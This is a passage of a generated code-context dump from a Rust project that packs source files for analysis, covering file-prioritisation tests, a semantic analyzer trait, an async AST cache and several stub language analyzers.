        let result = prioritize_files(files, &options, cache).unwrap();

        assert_eq!(result.len(), 2);
        assert_eq!(result[0].relative_path, PathBuf::from("high.rs"));
        assert_eq!(result[1].relative_path, PathBuf::from("low.txt"));
    }

    #[test]
    fn test_group_by_directory() {
        let files = vec![
            FileInfo {
                path: PathBuf::from("src/main.rs"),
                relative_path: PathBuf::from("src/main.rs"),
                size: 100,
                file_type: FileType::Rust,
                priority: 1.0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("src/lib.rs"),
                relative_path: PathBuf::from("src/lib.rs"),
                size: 100,
                file_type: FileType::Rust,
                priority: 1.0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("tests/test.rs"),
                relative_path: PathBuf::from("tests/test.rs"),
                size: 100,
                file_type: FileType::Rust,
                priority: 0.8,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        let groups = group_by_directory(files);

        assert_eq!(groups.len(), 2);
        assert_eq!(groups[0].0, "src");
        assert_eq!(groups[0].1.len(), 2);
        assert_eq!(groups[1].0, "tests");
        assert_eq!(groups[1].1.len(), 1);
    }

    #[test]
    fn test_prioritize_algorithm_ordering() {
        let temp_dir = TempDir::new().unwrap();
        let files = vec![
            FileInfo {
                path: temp_dir.path().join("test.rs"),
                relative_path: PathBuf::from("test.rs"),
                size: 500,
                file_type: FileType::Rust,
                priority: 0.8,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: temp_dir.path().join("main.rs"),
                relative_path: PathBuf::from("main.rs"),
                size: 1000,
                file_type: FileType::Rust,
                priority: 1.5,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: temp_dir.path().join("lib.rs"),
                relative_path: PathBuf::from("lib.rs"),
                size: 800,
                file_type: FileType::Rust,
                priority: 1.2,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        create_test_files(&temp_dir, &files);
        let cache = create_test_cache();
        let options = ContextOptions::default();
        let result = prioritize_files(files, &options, cache).unwrap();

        // Should return all files when no limit
        assert_eq!(result.len(), 3);

        // Files should be sorted by priority (highest first)
        assert_eq!(result[0].relative_path, PathBuf::from("main.rs"));
        assert_eq!(result[1].relative_path, PathBuf::from("lib.rs"));
        assert_eq!(result[2].relative_path, PathBuf::from("test.rs"));
    }

    #[test]
    fn test_calculate_structure_overhead() {
        let files = vec![FileInfo {
            path: PathBuf::from("main.rs"),
            relative_path: PathBuf::from("main.rs"),
            size: 1000,
            file_type: FileType::Rust,
            priority: 1.5,
            imports: Vec::new(),
            imported_by: Vec::new(),
            function_calls: Vec::new(),
            type_references: Vec::new(),
        }];

        let options = ContextOptions {
            max_tokens: None,
            include_tree: true,
            include_stats: true,
            group_by_type: true,
            sort_by_priority: true,
            file_header_template: "## {path}".to_string(),
            doc_header_template: "# Code Context".to_string(),
            include_toc: true,
            enhanced_context: false,
        };

        let overhead = calculate_structure_overhead(&options, &files).unwrap();

        // Should account for headers, tree, stats, TOC
        assert!(overhead > 0);
        assert!(overhead < 10000); // Reasonable upper bound
    }

    #[test]
    fn test_priority_ordering() {
        let mut files = [
            FileInfo {
                path: PathBuf::from("test.rs"),
                relative_path: PathBuf::from("test.rs"),
                size: 500,
                file_type: FileType::Rust,
                priority: 0.8,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("main.rs"),
                relative_path: PathBuf::from("main.rs"),
                size: 1000,
                file_type: FileType::Rust,
                priority: 1.5,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("lib.rs"),
                relative_path: PathBuf::from("lib.rs"),
                size: 800,
                file_type: FileType::Rust,
                priority: 1.2,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        // Sort by priority (highest first)
        files.sort_by(|a, b| b.priority.partial_cmp(&a.priority).unwrap());

        assert_eq!(files[0].relative_path, PathBuf::from("main.rs"));
        assert_eq!(files[1].relative_path, PathBuf::from("lib.rs"));
        assert_eq!(files[2].relative_path, PathBuf::from("test.rs"));
    }

    #[test]
    fn test_group_by_directory_complex() {
        let files = vec![
            FileInfo {
                path: PathBuf::from("src/core/mod.rs"),
                relative_path: PathBuf::from("src/core/mod.rs"),
                size: 500,
                file_type: FileType::Rust,
                priority: 1.0,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("src/utils/helpers.rs"),
                relative_path: PathBuf::from("src/utils/helpers.rs"),
                size: 300,
                file_type: FileType::Rust,
                priority: 0.9,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("tests/integration.rs"),
                relative_path: PathBuf::from("tests/integration.rs"),
                size: 200,
                file_type: FileType::Rust,
                priority: 0.8,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
            FileInfo {
                path: PathBuf::from("main.rs"),
                relative_path: PathBuf::from("main.rs"),
                size: 1000,
                file_type: FileType::Rust,
                priority: 1.5,
                imports: Vec::new(),
                imported_by: Vec::new(),
                function_calls: Vec::new(),
                type_references: Vec::new(),
            },
        ];

        let grouped = group_by_directory(files);

        // Should have at least 3 groups
        assert!(grouped.len() >= 3);

        // Check that files are correctly grouped by directory
        let has_root_or_main = grouped.iter().any(|(dir, files)| {
            (dir == "." || dir.is_empty())
                && files
                    .iter()
                    .any(|f| f.relative_path == PathBuf::from("main.rs"))
        });
        assert!(has_root_or_main);

        let has_src_core = grouped.iter().any(|(dir, files)| {
            dir == "src/core"
                && files
                    .iter()
                    .any(|f| f.relative_path == PathBuf::from("src/core/mod.rs"))
        });
        assert!(has_src_core);
    }

    #[test]
    fn test_adjust_priorities_for_dependencies() {
        let mut files = vec![
            FileInfo {
                path: PathBuf::from("main.rs"),
                relative_path: PathBuf::from("main.rs"),
                size: 1000,
                file_type: FileType::Rust,
                priority: 2.0,
                imports: vec![PathBuf::from("lib.rs"), PathBuf::from("utils.rs")],
                imported_by: vec![],
                function_calls: vec![],
                type_references: vec![],
            },
            FileInfo {
                path: PathBuf::from("lib.rs"),
                relative_path: PathBuf::from("lib.rs"),
                size: 800,
                file_type: FileType::Rust,
                priority: 1.0,
                imports: vec![],
                imported_by: vec![PathBuf::from("main.rs")],
                function_calls: vec![],
                type_references: vec![],
            },
            FileInfo {
                path: PathBuf::from("utils.rs"),
                relative_path: PathBuf::from("utils.rs"),
                size: 500,
                file_type: FileType::Rust,
                priority: 0.8,
                imports: vec![],
                imported_by: vec![PathBuf::from("main.rs")],
                function_calls: vec![],
                type_references: vec![],
            },
            FileInfo {
                path: PathBuf::from("unused.rs"),
                relative_path: PathBuf::from("unused.rs"),
                size: 300,
                file_type: FileType::Rust,
                priority: 0.5,
                imports: vec![],
                imported_by: vec![],
                function_calls: vec![],
                type_references: vec![],
            },
        ];

        let original_priorities: Vec<f32> = files.iter().map(|f| f.priority).collect();

        adjust_priorities_for_dependencies(&mut files);

        // main.rs priority should remain unchanged (it's not imported by anything)
        assert_eq!(files[0].priority, original_priorities[0]);

        // lib.rs should get a boost (imported by main.rs with priority 2.0)
        assert!(files[1].priority > original_priorities[1]);
        assert_eq!(files[1].priority, original_priorities[1] + 2.0 * 0.2);

        // utils.rs should also get a boost
        assert!(files[2].priority > original_priorities[2]);
        assert_eq!(files[2].priority, original_priorities[2] + 2.0 * 0.2);

        // unused.rs should remain unchanged (not imported by anything)
        assert_eq!(files[3].priority, original_priorities[3]);
    }
}
```

## src/core/semantic/analyzer.rs

Imports: crate::utils::error::ContextCreatorError, std::collections::HashSet, std

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, SemanticResult, T, T, crate::utils::error::ContextCreatorError.ContextCreatorError, SemanticContext, std.PathBuf, std.PathBuf, std.PathBuf, std.PathBuf, std.PathBuf, SemanticContext, std.PathBuf, std.PathBuf, std.PathBuf, std.PathBuf, Self, Self, Self, std.PathBuf, std.PathBuf, Self, Import, FunctionCall, TypeReference, std.PathBuf, AnalysisResult, Import, FunctionCall, TypeReference, LanguageAnalyzer, Send, Send, Sync, Sync, std.Path, std.Path, SemanticContext, SemanticContext, SemanticResult, SemanticResult, AnalysisResult, SemanticContext, SemanticContext, SemanticResult, SemanticResult, SemanticResult, Import, SemanticContext, SemanticContext, SemanticResult, SemanticResult, SemanticResult, FunctionCall, SemanticContext, SemanticContext, SemanticResult, SemanticResult, SemanticResult, TypeReference, TypeReference, TypeReference, SemanticContext, SemanticContext, std.PathBuf

```rust
//! Base trait and types for language-specific semantic analyzers

use crate::utils::error::ContextCreatorError;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

/// Result type for semantic analysis operations
pub type SemanticResult<T> = Result<T, ContextCreatorError>;

/// Context information for semantic analysis
#[derive(Debug, Clone)]
pub struct SemanticContext {
    /// Current file being analyzed
    pub current_file: PathBuf,
    /// Base directory for the project
    pub base_dir: PathBuf,
    /// Current depth in dependency traversal
    pub current_depth: usize,
    /// Maximum allowed depth
    pub max_depth: usize,
    /// Files already visited (for cycle detection)
    pub visited_files: HashSet<PathBuf>,
}

impl SemanticContext {
    /// Create a new semantic context
    pub fn new(current_file: PathBuf, base_dir: PathBuf, max_depth: usize) -> Self {
        Self {
            current_file,
            base_dir,
            current_depth: 0,
            max_depth,
            visited_files: HashSet::new(),
        }
    }

    /// Check if we've reached maximum depth
    pub fn at_max_depth(&self) -> bool {
        self.current_depth >= self.max_depth
    }

    /// Create a child context for analyzing a dependency
    pub fn child_context(&self, file: PathBuf) -> Option<Self> {
        if self.at_max_depth() || self.visited_files.contains(&file) {
            return None;
        }

        let mut child = self.clone();
        child.current_file = file.clone();
        child.current_depth += 1;
        child.visited_files.insert(file);
        Some(child)
    }
}

/// Information about an import statement
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct Import {
    /// The module/package being imported
    pub module: String,
    /// Specific items imported (if any)
    pub items: Vec<String>,
    /// Whether this is a relative import
    pub is_relative: bool,
    /// Line number where import appears
    pub line: usize,
}

/// Information about a function call
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct FunctionCall {
    /// Name of the function being called
    pub name: String,
    /// Module the function comes from (if known)
    pub module: Option<String>,
    /// Line number where call appears
    pub line: usize,
}

/// Information about a type reference
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct TypeReference {
    /// Name of the type
    pub name: String,
    /// Module the type comes from (if known)
    pub module: Option<String>,
    /// Line number where reference appears
    pub line: usize,
    /// Path to the file that defines this type
    pub definition_path: Option<PathBuf>,
    /// Whether this type is from an external dependency
    pub is_external: bool,
    /// External package name and version (e.g., "serde v1.0.197")
    pub external_package: Option<String>,
}

/// Results from semantic analysis
#[derive(Debug, Default)]
pub struct AnalysisResult {
    /// Import statements found
    pub imports: Vec<Import>,
    /// Function calls found
    pub function_calls: Vec<FunctionCall>,
    /// Type references found
    pub type_references: Vec<TypeReference>,
    /// Errors encountered during analysis (non-fatal)
    pub errors: Vec<String>,
}

/// Base trait for language-specific analyzers
pub trait LanguageAnalyzer: Send + Sync {
    /// Get the language name
    fn language_name(&self) -> &'static str;

    /// Analyze a file and extract semantic information
    fn analyze_file(
        &self,
        path: &Path,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult>;

    /// Parse and analyze imports from the file
    fn analyze_imports(
        &self,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<Vec<Import>> {
        // Default implementation - languages can override
        let result = self.analyze_file(&context.current_file, content, context)?;
        Ok(result.imports)
    }

    /// Parse and analyze function calls from the file
    fn analyze_function_calls(
        &self,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<Vec<FunctionCall>> {
        // Default implementation - languages can override
        let result = self.analyze_file(&context.current_file, content, context)?;
        Ok(result.function_calls)
    }

    /// Parse and analyze type references from the file
    fn analyze_type_references(
        &self,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<Vec<TypeReference>> {
        // Default implementation - languages can override
        let result = self.analyze_file(&context.current_file, content, context)?;
        Ok(result.type_references)
    }

    /// Check if this analyzer can handle the given file extension
    fn can_handle_extension(&self, extension: &str) -> bool;

    /// Get file extensions this analyzer handles
    fn supported_extensions(&self) -> Vec<&'static str>;

    /// Resolve a type reference to its definition file
    /// Returns None if the type cannot be resolved or is external
    fn resolve_type_definition(
        &self,
        _type_ref: &TypeReference,
        _context: &SemanticContext,
    ) -> Option<PathBuf> {
        // Default implementation returns None
        // Languages should override this to provide type resolution
        None
    }
}
```

## src/core/semantic/cache.rs

Imports: crate::core::semantic::parser_pool::ParserPoolManager, crate::utils::error::ContextCreatorError, moka::future::Cache, std::collections::hash_map::DefaultHasher, std, std::sync::Arc, std::time::Duration, tokio::time::timeout, tree_sitter::Tree, tests, super::*, cache

Type references: crate::core::semantic::parser_pool::ParserPoolManager.ParserPoolManager, crate::utils::error::ContextCreatorError.ContextCreatorError, moka::future::Cache.Cache, std::collections::hash_map::DefaultHasher.DefaultHasher, std::time::Duration.Duration, timeout, tree_sitter::Tree.Tree, CacheKey, std.PathBuf, std.PathBuf, CacheKey, std.Path, std.Path, Self, Self, Self, CacheEntry, tree_sitter::Tree.Tree, AstCacheV2, moka::future::Cache.Cache, moka::future::Cache.Cache, moka::future::Cache.Cache, CacheKey, CacheEntry, crate::core::semantic::parser_pool::ParserPoolManager.ParserPoolManager, std::time::Duration.Duration, std::time::Duration.Duration, AstCacheV2, Self, Self, Self, std::time::Duration.Duration, std::time::Duration.Duration, std::time::Duration.Duration, std::time::Duration.Duration, Self, Self, Self, std.Path, std.Path, tree_sitter::Tree.Tree, crate::utils::error::ContextCreatorError.ContextCreatorError, tree_sitter::Tree.Tree, crate::utils::error::ContextCreatorError.ContextCreatorError, CacheEntry, std.Path, std.Path, CacheKey, CacheStats, CacheStats, CacheStats, CacheStats

```rust
//! Modern async cache implementation using moka and parser pools
//! Provides bounded memory usage and timeout protection

use crate::core::semantic::parser_pool::ParserPoolManager;
use crate::utils::error::ContextCreatorError;
use moka::future::Cache;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;
use tokio::time::timeout;
use tree_sitter::Tree;

/// Cache key for AST storage
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct CacheKey {
    /// File path (not canonicalized to avoid panics)
    path: PathBuf,
    /// File content hash for validation
    content_hash: u64,
    /// Language of the file
    language: String,
}

impl CacheKey {
    fn new(path: &Path, content: &str, language: &str) -> Self {
        let mut hasher = DefaultHasher::new();
        content.hash(&mut hasher);
        let content_hash = hasher.finish();

        Self {
            path: path.to_path_buf(),
            content_hash,
            language: language.to_string(),
        }
    }
}

/// Cached AST entry
#[derive(Clone)]
struct CacheEntry {
    /// Parsed syntax tree (wrapped in Arc for cheap cloning)
    tree: Arc<Tree>,
    /// Source content (wrapped in Arc for cheap cloning)
    content: Arc<String>,
}

/// Modern async AST cache with bounded memory and timeout protection
#[derive(Clone)]
pub struct AstCacheV2 {
    /// Moka cache with automatic eviction
    cache: Cache<CacheKey, CacheEntry>,
    /// Parser pool manager
    parser_pool: Arc<ParserPoolManager>,
    /// Parsing timeout duration
    parse_timeout: Duration,
}

impl AstCacheV2 {
    /// Create a new AST cache with the specified capacity
    pub fn new(capacity: u64) -> Self {
        let cache = Cache::builder()
            .max_capacity(capacity)
            .time_to_live(Duration::from_secs(3600)) // 1 hour TTL
            .build();

        Self {
            cache,
            parser_pool: Arc::new(ParserPoolManager::new()),
            parse_timeout: Duration::from_secs(30), // 30 second timeout
        }
    }

    /// Create a new AST cache with custom configuration
    pub fn with_config(capacity: u64, ttl: Duration, parse_timeout: Duration) -> Self {
        let cache = Cache::builder()
            .max_capacity(capacity)
            .time_to_live(ttl)
            .build();

        Self {
            cache,
            parser_pool: Arc::new(ParserPoolManager::new()),
            parse_timeout,
        }
    }

    /// Get or parse an AST for the given file
    pub async fn get_or_parse(
        &self,
        path: &Path,
        content: &str,
        language: &str,
    ) -> Result<Arc<Tree>, ContextCreatorError> {
        let key = CacheKey::new(path, content, language);

        // Clone for the async block
        let parser_pool = self.parser_pool.clone();
        let content_clone = content.to_string();
        let language_clone = language.to_string();
        let path_clone = path.to_path_buf();
        let timeout_duration = self.parse_timeout;

        // Use try_get_with for fallible operations
        let entry = self
            .cache
            .try_get_with(key, async move {
                // Parse with timeout protection
                let parse_result = timeout(timeout_duration, async {
                    let mut parser = parser_pool.get_parser(&language_clone).await?;

                    let tree = parser.parse(&content_clone, None).ok_or_else(|| {
                        ContextCreatorError::ParseError(format!(
                            "Failed to parse {} file: {}",
                            language_clone,
                            path_clone.display()
                        ))
                    })?;

                    Ok::<Tree, ContextCreatorError>(tree)
                })
                .await;

                match parse_result {
                    Ok(Ok(tree)) => Ok(CacheEntry {
                        tree: Arc::new(tree),
                        content: Arc::new(content_clone),
                    }),
                    Ok(Err(e)) => Err(e),
                    Err(_) => Err(ContextCreatorError::ParseError(format!(
                        "Parsing timed out after {:?} for file: {}",
                        timeout_duration,
                        path_clone.display()
                    ))),
                }
            })
            .await
            .map_err(|e| {
                ContextCreatorError::ParseError(format!("Failed to cache parse result: {e}"))
            })?;

        Ok(entry.tree.clone())
    }

    /// Get cached content for a file if available
    pub async fn get_content(
        &self,
        path: &Path,
        content_hash: &str,
        language: &str,
    ) -> Option<Arc<String>> {
        // Create a temporary key to check cache
        let mut hasher = DefaultHasher::new();
        content_hash.hash(&mut hasher);
        let hash = hasher.finish();

        let key = CacheKey {
            path: path.to_path_buf(),
            content_hash: hash,
            language: language.to_string(),
        };

        self.cache
            .get(&key)
            .await
            .map(|entry| entry.content.clone())
    }

    /// Clear the cache
    pub async fn clear(&self) {
        self.cache.invalidate_all();
    }

    /// Get current cache size
    pub fn len(&self) -> u64 {
        self.cache.entry_count()
    }

    /// Check if cache is empty
    pub fn is_empty(&self) -> bool {
        self.cache.entry_count() == 0
    }

    /// Get cache statistics
    pub fn stats(&self) -> CacheStats {
        CacheStats {
            hits: 0, // Moka doesn't expose stats in the same way
            misses: 0,
            evictions: 0,
            entry_count: self.cache.entry_count(),
        }
    }
}

/// Cache statistics
#[derive(Debug, Clone)]
pub struct CacheStats {
    pub hits: u64,
    pub misses: u64,
    pub evictions: u64,
    pub entry_count: u64,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_cache_operations() {
        let cache = AstCacheV2::new(10);

        assert_eq!(cache.len(), 0);
        assert!(cache.is_empty());

        // Parse and cache a file
        let path = Path::new("test.rs");
        let content = "fn main() {}";
        let result = cache.get_or_parse(path, content, "rust").await;
        assert!(result.is_ok());

        // Give cache time to update
        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;

        // Moka cache has eventual consistency, so len() might not reflect immediately
        // Instead check that we can retrieve the cached item
        let result2 = cache.get_or_parse(path, content, "rust").await;
        assert!(result2.is_ok());

        // Clear cache
        cache.clear().await;
        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
    }

    #[tokio::test]
    async fn test_cache_hit() {
        let cache = AstCacheV2::new(10);

        let path = Path::new("test.py");
        let content = "def test(): pass";

        // First call - cache miss
        let result1 = cache.get_or_parse(path, content, "python").await;
        assert!(result1.is_ok());

        // Second call - cache hit (same content)
        let result2 = cache.get_or_parse(path, content, "python").await;
        assert!(result2.is_ok());

        // Trees should be the same (Arc comparison)
        assert!(Arc::ptr_eq(&result1.unwrap(), &result2.unwrap()));
    }

    #[tokio::test]
    async fn test_cache_invalidation_on_content_change() {
        let cache = AstCacheV2::new(10);

        let path = Path::new("test.js");
        let content1 = "function test() {}";
        let content2 = "function test2() {}";

        // Parse with first content
        let result1 = cache.get_or_parse(path, content1, "javascript").await;
        assert!(result1.is_ok());

        // Parse with different content - should not hit cache
        let result2 = cache.get_or_parse(path, content2, "javascript").await;
        assert!(result2.is_ok());

        // Trees should be different
        assert!(!Arc::ptr_eq(&result1.unwrap(), &result2.unwrap()));
    }

    #[tokio::test]
    async fn test_concurrent_parsing() {
        let cache = Arc::new(AstCacheV2::new(100));
        let mut handles = vec![];

        // Spawn multiple tasks parsing the same file
        for _i in 0..10 {
            let cache_clone = cache.clone();
            let handle = tokio::spawn(async move {
                let path = Path::new("concurrent.rs");
                let content = "fn main() { println!(\"test\"); }";
                cache_clone.get_or_parse(path, content, "rust").await
            });
            handles.push(handle);
        }

        // All should succeed
        for handle in handles {
            assert!(handle.await.unwrap().is_ok());
        }

        // Give cache time to update
        tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;

        // With eventual consistency, just verify operations succeeded
        // The important part is that parsing didn't happen 10 times
        assert!(cache.len() <= 10); // At most one per concurrent request
    }

    #[tokio::test]
    async fn test_timeout_configuration() {
        // Create cache with very short timeout
        let cache =
            AstCacheV2::with_config(10, Duration::from_secs(3600), Duration::from_millis(1));

        // This should complete quickly even with short timeout
        let path = Path::new("test.rs");
        let content = "fn main() {}";
        let result = cache.get_or_parse(path, content, "rust").await;

        // Should still succeed as parsing is fast
        assert!(result.is_ok());
    }
}
```

## src/core/semantic/languages/c.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, CAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, CAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, CAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for C

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct CAnalyzer {
    #[allow(dead_code)]
    parser: Parser,
}

impl CAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_c::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_c::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for CAnalyzer {
    fn language_name(&self) -> &'static str {
        "C"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement C analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "c" || extension == "h"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["c", "h"]
    }
}
```

## src/core/semantic/languages/cpp.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, CppAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, CppAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, CppAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Cpp

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct CppAnalyzer {
    #[allow(dead_code)]
    parser: Parser,
}

impl CppAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_cpp::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_cpp::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for CppAnalyzer {
    fn language_name(&self) -> &'static str {
        "Cpp"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Cpp analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "cpp" | "cc" | "cxx" | "hpp" | "h")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["cpp", "cc", "cxx", "hpp", "h"]
    }
}
```

## src/core/semantic/languages/csharp.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, CSharpAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, CSharpAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, CSharpAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for CSharp

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct CSharpAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl CSharpAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_c_sharp::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_c_sharp::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for CSharpAnalyzer {
    fn language_name(&self) -> &'static str {
        "CSharp"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement CSharp analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "cs")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["cs"]
    }
}
```

## src/core/semantic/languages/dart.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, DartAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, DartAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, DartAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Dart

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct DartAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl DartAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_dart::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_dart::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for DartAnalyzer {
    fn language_name(&self) -> &'static str {
        "Dart"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Dart analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "dart")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["dart"]
    }
}
```

## src/core/semantic/languages/elixir.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, ElixirAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, ElixirAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, ElixirAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Elixir

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct ElixirAnalyzer {
    #[allow(dead_code)]
    parser: Parser,
}

impl ElixirAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_elixir::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_elixir::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for ElixirAnalyzer {
    fn language_name(&self) -> &'static str {
        "Elixir"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Elixir analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "ex" || extension == "exs"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["ex", "exs"]
    }
}
```

## src/core/semantic/languages/elm.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, ElmAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, ElmAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, ElmAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Elm

use crate::core::semantic::analyzer::{
